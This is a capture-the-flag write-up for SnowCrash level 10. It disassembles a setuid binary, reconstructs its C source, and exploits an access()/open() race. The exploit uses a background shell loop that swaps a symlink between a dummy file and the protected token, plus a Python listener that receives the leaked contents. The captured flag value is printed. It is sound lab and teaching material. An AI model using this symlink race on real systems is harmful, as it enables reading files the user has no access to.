## LEVEL 10

---

```asm
Dump of assembler code for function main:
   0x080486d4 <+0>:	push   %ebp
   0x080486d5 <+1>:	mov    %esp,%ebp
   0x080486d7 <+3>:	and    $0xfffffff0,%esp
   0x080486da <+6>:	sub    $0x1050,%esp
   0x080486e0 <+12>:	mov    0xc(%ebp),%eax
   0x080486e3 <+15>:	mov    %eax,0x1c(%esp)
   0x080486e7 <+19>:	mov    %gs:0x14,%eax
   0x080486ed <+25>:	mov    %eax,0x104c(%esp)
   0x080486f4 <+32>:	xor    %eax,%eax
   0x080486f6 <+34>:	cmpl   $0x2,0x8(%ebp)
   0x080486fa <+38>:	jg     0x804871f <main+75>
   0x080486fc <+40>:	mov    0x1c(%esp),%eax
   0x08048700 <+44>:	mov    (%eax),%edx
   0x08048702 <+46>:	mov    $0x8048a40,%eax
   0x08048707 <+51>:	mov    %edx,0x4(%esp)
   0x0804870b <+55>:	mov    %eax,(%esp)
   0x0804870e <+58>:	call   0x8048520 <printf@plt>
   0x08048713 <+63>:	movl   $0x1,(%esp)
   0x0804871a <+70>:	call   0x8048590 <exit@plt>
   0x0804871f <+75>:	mov    0x1c(%esp),%eax
   0x08048723 <+79>:	mov    0x4(%eax),%eax
   0x08048726 <+82>:	mov    %eax,0x28(%esp)
   0x0804872a <+86>:	mov    0x1c(%esp),%eax
   0x0804872e <+90>:	mov    0x8(%eax),%eax
   0x08048731 <+93>:	mov    %eax,0x2c(%esp)
   0x08048735 <+97>:	mov    0x1c(%esp),%eax
   0x08048739 <+101>:	add    $0x4,%eax
   0x0804873c <+104>:	mov    (%eax),%eax
   0x0804873e <+106>:	movl   $0x4,0x4(%esp)
   0x08048746 <+114>:	mov    %eax,(%esp)
   0x08048749 <+117>:	call   0x80485e0 <access@plt>
   0x0804874e <+122>:	test   %eax,%eax
   0x08048750 <+124>:	jne    0x8048940 <main+620>
   0x08048756 <+130>:	mov    $0x8048a7b,%eax
   0x0804875b <+135>:	mov    0x2c(%esp),%edx
   0x0804875f <+139>:	mov    %edx,0x4(%esp)
   0x08048763 <+143>:	mov    %eax,(%esp)
   0x08048766 <+146>:	call   0x8048520 <printf@plt>
   0x0804876b <+151>:	mov    0x804a060,%eax
   0x08048770 <+156>:	mov    %eax,(%esp)
   0x08048773 <+159>:	call   0x8048530 <fflush@plt>
   0x08048778 <+164>:	movl   $0x0,0x8(%esp)
   0x08048780 <+172>:	movl   $0x1,0x4(%esp)
   0x08048788 <+180>:	movl   $0x2,(%esp)
   0x0804878f <+187>:	call   0x80485f0 <socket@plt>
   0x08048794 <+192>:	mov    %eax,0x30(%esp)
   0x08048798 <+196>:	lea    0x103c(%esp),%eax
   0x0804879f <+203>:	movl   $0x0,(%eax)
   0x080487a5 <+209>:	movl   $0x0,0x4(%eax)
   0x080487ac <+216>:	movl   $0x0,0x8(%eax)
   0x080487b3 <+223>:	movl   $0x0,0xc(%eax)
   0x080487ba <+230>:	movw   $0x2,0x103c(%esp)
   0x080487c4 <+240>:	mov    0x2c(%esp),%eax
   0x080487c8 <+244>:	mov    %eax,(%esp)
   0x080487cb <+247>:	call   0x8048600 <inet_addr@plt>
   0x080487d0 <+252>:	mov    %eax,0x1040(%esp)
   0x080487d7 <+259>:	movl   $0x1b39,(%esp)
   0x080487de <+266>:	call   0x8048550 <htons@plt>
   0x080487e3 <+271>:	mov    %ax,0x103e(%esp)
   0x080487eb <+279>:	movl   $0x10,0x8(%esp)
   0x080487f3 <+287>:	lea    0x103c(%esp),%eax
   0x080487fa <+294>:	mov    %eax,0x4(%esp)
   0x080487fe <+298>:	mov    0x30(%esp),%eax
   0x08048802 <+302>:	mov    %eax,(%esp)
   0x08048805 <+305>:	call   0x8048610 <connect@plt>
   0x0804880a <+310>:	cmp    $0xffffffff,%eax
   0x0804880d <+313>:	jne    0x8048830 <main+348>
   0x0804880f <+315>:	mov    $0x8048a95,%eax
   0x08048814 <+320>:	mov    0x2c(%esp),%edx
   0x08048818 <+324>:	mov    %edx,0x4(%esp)
   0x0804881c <+328>:	mov    %eax,(%esp)
   0x0804881f <+331>:	call   0x8048520 <printf@plt>
   0x08048824 <+336>:	movl   $0x1,(%esp)
   0x0804882b <+343>:	call   0x8048590 <exit@plt>
   0x08048830 <+348>:	movl   $0x8,0x8(%esp)
   0x08048838 <+356>:	movl   $0x8048ab3,0x4(%esp)
   0x08048840 <+364>:	mov    0x30(%esp),%eax
   0x08048844 <+368>:	mov    %eax,(%esp)
   0x08048847 <+371>:	call   0x80485c0 <write@plt>
   0x0804884c <+376>:	cmp    $0xffffffff,%eax
   0x0804884f <+379>:	jne    0x8048872 <main+414>
   0x08048851 <+381>:	mov    $0x8048abc,%eax
   0x08048856 <+386>:	mov    0x2c(%esp),%edx
   0x0804885a <+390>:	mov    %edx,0x4(%esp)
   0x0804885e <+394>:	mov    %eax,(%esp)
   0x08048861 <+397>:	call   0x8048520 <printf@plt>
   0x08048866 <+402>:	movl   $0x1,(%esp)
   0x0804886d <+409>:	call   0x8048590 <exit@plt>
   0x08048872 <+414>:	mov    $0x8048adf,%eax
   0x08048877 <+419>:	mov    %eax,(%esp)
   0x0804887a <+422>:	call   0x8048520 <printf@plt>
   0x0804887f <+427>:	mov    0x804a060,%eax
   0x08048884 <+432>:	mov    %eax,(%esp)
   0x08048887 <+435>:	call   0x8048530 <fflush@plt>
   0x0804888c <+440>:	movl   $0x0,0x4(%esp)
   0x08048894 <+448>:	mov    0x28(%esp),%eax
   0x08048898 <+452>:	mov    %eax,(%esp)
   0x0804889b <+455>:	call   0x80485a0 <open@plt>
   0x080488a0 <+460>:	mov    %eax,0x34(%esp)
   0x080488a4 <+464>:	cmpl   $0xffffffff,0x34(%esp)
   0x080488a9 <+469>:	jne    0x80488c3 <main+495>
   0x080488ab <+471>:	movl   $0x8048afb,(%esp)
   0x080488b2 <+478>:	call   0x8048560 <puts@plt>
   0x080488b7 <+483>:	movl   $0x1,(%esp)
   0x080488be <+490>:	call   0x8048590 <exit@plt>
   0x080488c3 <+495>:	movl   $0x1000,0x8(%esp)
   0x080488cb <+503>:	lea    0x3c(%esp),%eax
   0x080488cf <+507>:	mov    %eax,0x4(%esp)
   0x080488d3 <+511>:	mov    0x34(%esp),%eax
   0x080488d7 <+515>:	mov    %eax,(%esp)
   0x080488da <+518>:	call   0x8048510 <read@plt>
   0x080488df <+523>:	mov    %eax,0x38(%esp)
   0x080488e3 <+527>:	cmpl   $0xffffffff,0x38(%esp)
   0x080488e8 <+532>:	jne    0x8048916 <main+578>
   0x080488ea <+534>:	call   0x80485d0 <__errno_location@plt>
   0x080488ef <+539>:	mov    (%eax),%eax
   0x080488f1 <+541>:	mov    %eax,(%esp)
   0x080488f4 <+544>:	call   0x8048570 <strerror@plt>
   0x080488f9 <+549>:	mov    $0x8048b15,%edx
   0x080488fe <+554>:	mov    %eax,0x4(%esp)
   0x08048902 <+558>:	mov    %edx,(%esp)
   0x08048905 <+561>:	call   0x8048520 <printf@plt>
   0x0804890a <+566>:	movl   $0x1,(%esp)
   0x08048911 <+573>:	call   0x8048590 <exit@plt>
   0x08048916 <+578>:	mov    0x38(%esp),%eax
   0x0804891a <+582>:	mov    %eax,0x8(%esp)
   0x0804891e <+586>:	lea    0x3c(%esp),%eax
   0x08048922 <+590>:	mov    %eax,0x4(%esp)
   0x08048926 <+594>:	mov    0x30(%esp),%eax
   0x0804892a <+598>:	mov    %eax,(%esp)
   0x0804892d <+601>:	call   0x80485c0 <write@plt>
   0x08048932 <+606>:	movl   $0x8048b33,(%esp)
   0x08048939 <+613>:	call   0x8048560 <puts@plt>
   0x0804893e <+618>:	jmp    0x8048955 <main+641>
   0x08048940 <+620>:	mov    $0x8048b3f,%eax
   0x08048945 <+625>:	mov    0x28(%esp),%edx
   0x08048949 <+629>:	mov    %edx,0x4(%esp)
   0x0804894d <+633>:	mov    %eax,(%esp)
   0x08048950 <+636>:	call   0x8048520 <printf@plt>
   0x08048955 <+641>:	mov    0x104c(%esp),%edx
   0x0804895c <+648>:	xor    %gs:0x14,%edx
   0x08048963 <+655>:	je     0x804896a <main+662>
   0x08048965 <+657>:	call   0x8048540 <__stack_chk_fail@plt>
   0x0804896a <+662>:	leave
   0x0804896b <+663>:	ret
```

```c
int main (int ac, char **av)
{
    if (ac != 3) {
        printf("%s file host\n\tsends file to host if you have access to it", av[0]);
        exit(1);
    }
    if (access(av[1], 4) == 0) {
        printf("Connecting to %s:6969 ..", av[2]);
        fflush(stdout);
        socket(2, 1, 0);
        inet_addr(av[2]);
        htons(6969)
        if (connect(7, ?, 10) == -1) {
            printf(?);
            exit(1);
        }
        if (write(?, ".*( )*.\n, 7") == -1) {
            printf("Unable to write banner to host %s\n", av[2])
            exit(1);
        }
        printf("Connected!\nSending file ..");
        int fd = open(av[1]);
        read(fd, buf, 52);
        write(?, buf, 52)
    }
}
```

This is a incomplete version of the source code of `level10` executable. It's imcomplete but we can understand what this level10 does and how to get the content of `token`.

In this level we have two functions `access` and `open` with some heavy operations between them. So I will use a race condition vulnerability. This technique involves of creating a symlink and rapidly change the link between the token and a accessible file.

But first we need to run a server TCP on the `6969` port. So I searched a python server on internet.

```python
import socket
import time

HOST = "127.0.1.42"  # Standard loopback interface address (localhost)
PORT = 6969  # Port to listen on (non-privileged ports are > 1023)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print("Connected by {addr}")
while True:
        data = conn.recv(1024)
        print(data)
        if not data:
                conn.close()
                break
        conn.sendall(data)
```

Now I just have to create the race condition script, run the server then run the executable.

```shell
$ echo "empty" > /tmp/empty
$ $(while true; do ln -sf /tmp/empty /tmp/token; ln -sf /home/user/level10/token /tmp/token; done) &
$ python /tmp/server.py &
$ ./level10 /tmp/token 127.0.1.42
Connecting to 127.0.1.42:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ .*( )*.
woupa2yuojeeaaed06riuj63c
```

---

*Source :*

*https://www.automox.com/blog/vulnerability-definition-race-condition#*

*https://realpython.com/python-sockets/#echo-server*